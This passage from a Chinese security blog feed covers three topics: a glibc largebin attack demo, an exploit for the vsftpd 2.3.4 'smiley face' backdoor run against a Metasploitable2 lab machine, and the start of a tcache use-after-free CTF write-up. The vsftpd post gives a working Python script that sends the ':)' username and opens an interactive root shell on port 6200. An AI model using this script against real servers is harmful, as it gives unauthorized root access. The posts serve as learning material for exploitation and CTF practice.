class="hljs-number">0x90</span>);<br> <span class="hljs-number">25</span> <br> <span class="hljs-number">26</span>     <span class="hljs-built_in">free</span>(p3);<br> <span class="hljs-number">27</span> <br> <span class="hljs-number">28</span>     p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br> <span class="hljs-number">29</span>     p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br> <span class="hljs-number">30</span>     p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br> <span class="hljs-number">31</span>     p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br> <span class="hljs-number">32</span>     p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br> <span class="hljs-number">33</span> <br> <span class="hljs-number">34</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <span class="hljs-number">35</span> <br> <span class="hljs-number">36</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> <span class="hljs-number">37</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <span class="hljs-number">38</span> <br> <span class="hljs-number">39</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <span class="hljs-number">40</span> &#125;<br></code></pre></td></tr></table></figure><p>简单解释一下程序，它先是定义了两个变量赋值为0，接着申请三个大小为0x320和0x400的chunk,中间申请的小chunk是为了防止合并，随后释放p1,p2,接着申请一个0x90的chunk,释放掉p3,接下来改变p2的size域，让他比p3小，然后将fd和fd_nextsize指针置空，把bk指向stack_var1-0x10,把bk_nextsize指向stack_var-0x20，最后申请0x90的chunk并打印两个变量的指针</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>接下里我们一步步调试</p><p>直接断点到释放p1，p2</p><p><img src="/img/largebin-attack/b"></p><p>可以看到两个chunk被挂进了unsortedbin,但实际还可以细分，p1应该是属于smallbin的，p2是属于largebin的，unsorted bin只是一个过渡作用</p><p>此时申请一个0x90的chunk,别看很简单，实际上经历了多个步骤</p><ol><li>根据大小把p2放进largebin,并标注largebin有空闲块</li><li>同样的把p1放进smallbin,并标注smallbin有空闲块</li><li>在smallbin中拿出一个chunk截取0x90满足申请</li><li>把剩下的chunk放入unsortedbin中</li></ol><p>接着释放p3,并且修改p2的数据</p><p><img src="/img/largebin-attack/c"></p><p><img src="/img/largebin-attack/d"></p><p>可以看到，有五处内容被修改：</p><p>size部分由原来的0x411修改成0x3f1(重点※※※※※)<br>fd部分置空（不超过一个地址位长度的数据都可以）<br>bk由0x7ffff7dd1f68修改成了stack_var1_addr - 0x10(0x7fffffffdf18)<br>fd_nextsize置空（不超过一个地址位长度的数据都可以）<br>bk_nextsize修改成stack_var2_addr - 0x20(0x7fffffffdf10)</p><p>那么此时largebin的实际效果就是</p><p><img src="/img/largebin-attack/e"></p><h5 id="bk-nextsize导致的地址任意写"><a href="#bk-nextsize导致的地址任意写" class="headerlink" title="bk_nextsize导致的地址任意写"></a>bk_nextsize导致的地址任意写</h5><p>那么接下来是再一次申请0x90的chunk并把p3挂进largebin</p><p>此时会根据p2和p3的大小来决定那个chunk更接近越接近large bin，越小越接近，即执行下面的代码</p><p>在2.23的glibc中的malloc.c文件中，比较的过程如下：</p><p><img src="/img/largebin-attack/f"></p><p>这里的条件是当前从unsorted bin中拿出的chunk的size是否小于large bin中前一个被释放chunk的size，如果小于，则执行while循环中的流程，但是很明显，我们修改了p2的size域，所以此时的p2是比p3大的，所以这个代码不会执行，直接进入接下里的判断</p><p><img src="/img/largebin-attack/g"></p><p>显然这两个chunk也不相等，下一个就是<code>比较P3_size &gt; P2_size</code>的情况了</p><p><img src="/img/largebin-attack/h"></p><p>还记得我们前面是修改了p2的bk,和bk_next的，也就下面</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">P2-&gt;bk-&gt;fd&lt;==&gt;stack_var1_addr（P2的fd指向的堆块的fd指向的是stack_var1的地址）<br>P2-&gt;bk_nextsize-&gt;fd_nextsize&lt;==&gt;stack_var2_addr的地址（P2的bk_nextsize指向的堆块的fd_nextsize指向的是stack_var2的地址）<br></code></pre></td></tr></table></figure><p>而上面的比较的代码可以解读为下面的情况</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">else</span><br>&#123;<br>P3<span class="hljs-punctuation">-&gt;</span>fd_nextsize = P2;  <span class="hljs-comment">//P3的fd_nextsize要修改成P2的头指针</span><br>P3<span class="hljs-punctuation">-&gt;</span>bk_nextsize = P2<span class="hljs-punctuation">-&gt;</span>bk_nextsize; <span class="hljs-comment">//P3的bk_nextsize要修改成P2的bk_nextsize指向的地址</span><br>P2<span class="hljs-punctuation">-&gt;</span>bk_nextsize = P3;  <span class="hljs-comment">//P2的bk_nextsize要修改成P3的头指针</span><br>P3<span class="hljs-punctuation">-&gt;</span>bk_nextsize<span class="hljs-punctuation">-&gt;</span>fd_nextsize = P3; <span class="hljs-comment">//P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针</span><br>&#125;<br>bck = P2<span class="hljs-punctuation">-&gt;</span>bk; <span class="hljs-comment">//bck等于P2的bk</span><br></code></pre></td></tr></table></figure><p>可能有点绕，那么我们一行行来看</p><p>因为P3-&gt;bk_nextsize &#x3D; P2-&gt;bk_nextsize</p><p>又因为P2-&gt;bk_nextsize-&gt;fd_nextsize&lt;&#x3D;&#x3D;&gt;stack_var2_addr</p><p>所以P3-&gt;bk_nextsize-&gt;fd_nextsize&lt;&#x3D;&#x3D;&gt;stack_var2_addr</p><p>又因为P3-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P3</p><p>所以stack_var2_addr&#x3D;P3</p><p>大概fd&#x2F;bk_nextsize的制定大概就是这么个流程</p><h5 id="bk导致的地址任意写"><a href="#bk导致的地址任意写" class="headerlink" title="bk导致的地址任意写"></a>bk导致的地址任意写</h5><p>在执行完对P3和P2的fd_nextsize和bk_nextsize的制定之后，还需要<code>对两个large chunk的fd和bk</code>进行制定：</p><p><img src="/img/largebin-attack/i"></p><p>上面的代码可以解释如下</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">mark_bin(av, victim_index);<br>P3-&gt;bk = p2-&gt;bk; <span class="hljs-comment">//P3的bk指针要等于P2的bk指针</span><br>P3-&gt;fd = P2; <span class="hljs-comment">//P3的fd指针要等于P2的头指针</span><br>P2-&gt;bk = P3; <span class="hljs-comment">//P2的bk指针要等于P3的头指针</span><br>P2-&gt;bk-&gt;fd = P3; <span class="hljs-comment">//P2的bk指针指向的堆块的fd指针要等于P3的头指针</span><br></code></pre></td></tr></table></figure><p>同理stack_var1_addr&#x3D;P3</p><p>查看修改结果</p><p>最后我们将直接运行程序至结束，再一次查看一下此时stack_var1和stack_var2中的值</p><p><img src="/img/largebin-attack/j"></p><p>可以看到两个变量的值已经变成p3的指针了</p><h4 id="malloc-c中从unsorted-bin中摘除chunk完整过程代码"><a href="#malloc-c中从unsorted-bin中摘除chunk完整过程代码" class="headerlink" title="malloc.c中从unsorted bin中摘除chunk完整过程代码"></a>malloc.c中从unsorted bin中摘除chunk完整过程代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br><br><span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br><span class="hljs-keyword">if</span> (size == nb)<br>  &#123;<br>    set_inuse_bit_at_offset (victim, size);<br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>      victim-&gt;size |= NON_MAIN_ARENA;<br>    check_malloced_chunk (av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>  &#125;<br><br><span class="hljs-comment">/* place chunk in bin */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>  &#123;<br>    victim_index = smallbin_index (size);<br>    bck = bin_at (av, victim_index);<br>    fwd = bck-&gt;fd;<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);<br>    fwd = bck-&gt;fd;<br><br>    <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>        size |= PREV_INUSE;<br>        <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>          &#123;<br>            fwd = bck;<br>            bck = bck-&gt;bk;<br><br>            victim-&gt;fd_nextsize = fwd-&gt;fd;<br>            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>              &#123;<br>                fwd = fwd-&gt;fd_nextsize;<br>                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>              &#125;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>              <span class="hljs-comment">/* Always insert in the second position.  */</span><br>              fwd = fwd-&gt;fd;<br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                victim-&gt;fd_nextsize = fwd;<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>            bck = fwd-&gt;bk;<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br><br></code></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/#large-bin-attack_2">Large Bin Attack-wiki</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/112825556">好好说话之Large Bin Attack</a></p><p><a href="https://xz.aliyun.com/t/5177?time__1311=n4+xnieWqCqYqY547KDsD7fm5n=vQKteHK84D#toc-1">浅析largebin attack</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笑脸漏洞检测并复现</title>
      <link href="/2024/10/17/python%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B9%B6%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/10/17/python%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B9%B6%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="python笑脸漏洞检测并复现"><a href="#python笑脸漏洞检测并复现" class="headerlink" title="python笑脸漏洞检测并复现"></a>python笑脸漏洞检测并复现</h1><p>一、原理<br>vsftpd 是“ very secure FTP daemon ”的缩写，安全性是它的一个最大的特点。 vsftpd是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux 、 BSD 、 Solaris 、HP UNIX 等系统上面，是一个完全免费的、开放源代码的 ftp 服务器软件，支持很多其他的FTP 服务器所不支持的特征</p><p>笑脸漏洞：这个漏洞是开发者在软件中留下的后门漏洞，当连接带有vsftpd 2.3.4版本的服务器的21端口时，输入用户中带有“:) ”,密码任意，即可运行 vsf_sysutil_extra() ：打开服务器的6200端口，并且不需要密码就能从6200端口以管理员身份登入目标服务器。因为输入用户名需要带有:)，所以称笑脸漏洞</p><p>二、实验器材</p><p>–kali</p><p>–Metasplotable2-Linux</p><p>三、漏洞复现</p><p>我们先用namp看当前局域网存活的主机</p><p><img src="/img/python%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B9%B6%E5%A4%8D%E7%8E%B0/1"></p><p>可以看到扫描到了攻击靶机，并且打开了21端口(ftp)</p><p>这里有一个脚本可以用来检测是否有笑脸漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_to_ftp</span>(<span class="hljs-params">host, port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 连接到FTP服务器</span><br>        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        ftp_socket.connect((host, port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功连接到FTP服务器 <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 接收FTP欢迎消息</span><br>        response = ftp_socket.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;FTP服务器响应: <span class="hljs-subst">&#123;response&#125;</span>&quot;</span>)<br> <br>        <span class="hljs-comment"># 发送恶意用户名</span><br>        ftp_socket.send(<span class="hljs-string">b&#x27;USER hacker:)\r\n&#x27;</span>)<br>        time.sleep(<span class="hljs-number">1</span>)<br>        <br>        <span class="hljs-comment"># 发送密码</span><br>        ftp_socket.send(<span class="hljs-string">b&#x27;PASS anypassword\r\n&#x27;</span>)<br>        time.sleep(<span class="hljs-number">1</span>)<br> <br>        response = ftp_socket.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;FTP响应: <span class="hljs-subst">&#123;response&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 检查是否能够连接到后门shell</span><br>        <span class="hljs-keyword">return</span> check_backdoor_shell(host)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接FTP服务器失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_backdoor_shell</span>(<span class="hljs-params">host</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 连接到6200端口，后门shell可能开启</span><br>        shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        shell_socket.connect((host, <span class="hljs-number">6200</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;后门shell已打开！连接到6200端口成功。&quot;</span>)<br>        <br>        <span class="hljs-comment"># 向shell发送命令，获取root权限</span><br>        shell_socket.send(<span class="hljs-string">b&#x27;id\n&#x27;</span>)<br>        time.sleep(<span class="hljs-number">1</span>)<br>        response = shell_socket.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;从shell获得的响应: <span class="hljs-subst">&#123;response&#125;</span>&quot;</span>)<br>        <br>        shell_socket.close()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接6200端口失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    target_host = <span class="hljs-string">&quot;192.168.190.130&quot;</span>  <span class="hljs-comment"># Metasploitable2的IP地址</span><br>    target_port = <span class="hljs-number">21</span>  <span class="hljs-comment"># FTP默认端口</span><br>    connect_to_ftp(target_host, target_port)<br></code></pre></td></tr></table></figure><p>这个脚本的运作原理其实非常简单，就是连接ftp服务器，发送恶意用户名来测试是否存在漏洞，存在即连接漏洞端口测试shell的响应</p><p><img src="/img/python%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B9%B6%E5%A4%8D%E7%8E%B0/2"></p><p>可以看到是连接成功的</p><p>博主心血来潮，尝试着把上面的检测代码改成远程控制shell的代码,试了一下，没想到成功了，毕竟拿shell是每一个pwn手的目标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_to_ftp</span>(<span class="hljs-params">host, port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 连接到FTP服务器</span><br>        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        ftp_socket.connect((host, port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功连接到FTP服务器 <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 接收FTP欢迎消息</span><br>        response = ftp_socket.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;FTP服务器响应: <span class="hljs-subst">&#123;response&#125;</span>&quot;</span>)<br> <br>        <span class="hljs-comment"># 发送恶意用户名</span><br>        ftp_socket.send(<span class="hljs-string">b&#x27;USER hacker:)\r\n&#x27;</span>)<br>        time.sleep(<span class="hljs-number">1</span>)<br>        <br>        <span class="hljs-comment"># 发送密码</span><br>        ftp_socket.send(<span class="hljs-string">b&#x27;PASS anypassword\r\n&#x27;</span>)<br>        time.sleep(<span class="hljs-number">1</span>)<br> <br>        response = ftp_socket.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;FTP响应: <span class="hljs-subst">&#123;response&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 检查是否能够连接到后门shell</span><br>        <span class="hljs-keyword">return</span> check_backdoor_shell(host)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接FTP服务器失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_backdoor_shell</span>(<span class="hljs-params">host</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 连接到6200端口，后门shell可能开启</span><br>        shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        <span class="hljs-comment">#shell_socket.connect((host, 6200))</span><br>        io=remote(host,<span class="hljs-number">6200</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;后门shell已打开！连接到6200端口成功。&quot;</span>)<br>        <br>        <span class="hljs-comment"># 向shell发送命令，获取root权限</span><br>        <span class="hljs-string">&#x27;&#x27;&#x27;shell_socket.send(b&#x27;ls\n&#x27;)</span><br><span class="hljs-string">        time.sleep(1)</span><br><span class="hljs-string">        response = shell_socket.recv(1024).decode()</span><br><span class="hljs-string">        print(f&quot;从shell获得的响应: &#123;response&#125;\n&quot;)&#x27;&#x27;&#x27;</span><br>        io.interactive()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接6200端口失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    target_host = <span class="hljs-string">&quot;192.168.190.130&quot;</span>  <span class="hljs-comment"># Metasploitable2的IP地址</span><br>    target_port = <span class="hljs-number">21</span>  <span class="hljs-comment"># FTP默认端口</span><br>    connect_to_ftp(target_host, target_port)<br></code></pre></td></tr></table></figure><p><img src="/img/python%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B9%B6%E5%A4%8D%E7%8E%B0/3"></p><p>可以对远程的靶机进行操作</p>]]></content>
      
      
      <categories>
          
          <category> 网络渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF与house_Spirit以及unsortedbin_leak在tcachebins的利用</title>
      <link href="/2024/10/13/Spirit%E4%BB%A5%E5%8F%8Aunsortedbin-leak%E5%9C%A8tcachebins%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2024/10/13/Spirit%E4%BB%A5%E5%8F%8Aunsortedbin-leak%E5%9C%A8tcachebins%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="UAF与house-Spirit以及unsortedbin-leak在tcachebins的利用"><a href="#UAF与house-Spirit以及unsortedbin-leak在tcachebins的利用" class="headerlink" title="UAF与house_Spirit以及unsortedbin_leak在tcachebins的利用"></a>UAF与house_Spirit以及unsortedbin_leak在tcachebins的利用</h1><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol><li><p>unsortedbin的fd指针指向main_arena+偏移，所以我们可以通过泄露unsortedbin的fd指针来泄露libc</p></li><li><p>在glibc2.29之前，tcachebins没有做过多安全检查，甚至比fastbin还要好利用，像doublefree,fastbin中还有着一些限制，而glibc2.29之前是完全开放的，之后就多加了一个安全检查，在free进会生成一个key,在free时会检查这个key,如果不为0是不允许继续free的，同时tcachebins最多挂7个chunk</p></li><li><p>在分配chunk时，程序会生成一个大的chunk来记录tcachebins中各个大小的chunk中的数量等各种信息</p><p><img src="/img/tcachebins/a" alt="img"></p><p><img src="/img/tcachebins/b" alt="img"></p><p><img src="/img/tcachebins/c" alt="img"></p></li><li><p>__malloc_hook和__free_hook劫持</p><p>简单来说就是执行malloc或free函数时，会进行malloc_hook(free_hook)的测试，如果malloc为0则继续执行，不为零则跳转到malloc_hook(free_hook),如果我们通过某种方法把malloc_hook的值改成system,那么我们malloc(‘&#x2F;bin&#x2F;sh’)是可以getshell的</p></li></ol><h3 id="Easy-note"><a href="#Easy-note" class="headerlink" title="Easy_note"></a>Easy_note</h3><h4 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h4><p><img src="/img/tcachebins/d" alt="img"></p><p>保护全开</p><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p><img src="/img/tcachebins/e" alt="img"></p><p>简单说一下这个函数，他对于创建chunk的数量和大小都有限制，输入大小和内容来创建，不得超过15个，chunk的大小小于0x90(数据域小于0x80)</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p><img src="/img/tcachebins/f" alt="img"></p><p>这是一个编辑函数，可以输入大小和内容来编辑，欸，那就存在很明显的堆溢出了，可以覆盖相邻chunk的内容</p><h4 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h4><p><img src="/img/tcachebins/g" alt="img"></p><p>这是一个简单的打印函数，输入chunk的索引来打印</p><h4 id="delt函数"><a href="#delt函数" class="headerlink" title="delt函数"></a>delt函数</h4><p><img src="/img/tcachebins/h" alt="img"></p><p>这是一个删除函数，但是我们可以看到它仅仅是free了内容，并没有置空指针，也就是说我们可以进行UAF的利用</p><h4 id="思路"><a href="#思路" class="headerlink" 